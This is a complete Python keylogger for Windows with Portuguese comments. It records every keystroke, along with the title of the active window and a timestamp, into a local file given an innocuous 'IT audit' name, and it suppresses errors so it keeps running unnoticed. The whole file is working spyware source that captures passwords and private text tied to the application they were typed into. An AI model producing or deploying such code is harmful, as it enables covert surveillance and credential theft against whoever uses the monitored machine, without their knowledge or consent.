import win32gui
from pynput.keyboard import Listener
import datetime
import os

arquivo_log = "auditoria_ti.txt"
ultima_janela = ""

def pegar_nome_janela():
    try:
        # Pega o título da janela que está em foco no Windows
        window = win32gui.GetForegroundWindow()
        return win32gui.GetWindowText(window)
    except:
        return "Janela Desconhecida"

def ao_pressionar(tecla):
    global ultima_janela
    janela_atual = pegar_nome_janela()
    
    try:
        with open(arquivo_log, "a", encoding="utf-8") as f:
            if janela_atual != ultima_janela:
                f.write(f"\n\n[ JANELA: {janela_atual} | HORA: {datetime.datetime.now().strftime('%d/%m/%Y %H:%M:%S')} ]\n")
                ultima_janela = janela_atual
            
            t = str(tecla).replace("'", "")
            if t == 'Key.space': t = ' '
            elif t == 'Key.enter': t = '\n'
            elif t == 'Key.backspace': t = ' [Apagar] '
            elif 'Key' in t: t = f' [{t}] '
            
            f.write(t)
    except:
        pass # Ignora erros de escrita para o script não parar de rodar

with Listener(on_press=ao_pressionar) as monitor:
    monitor.join()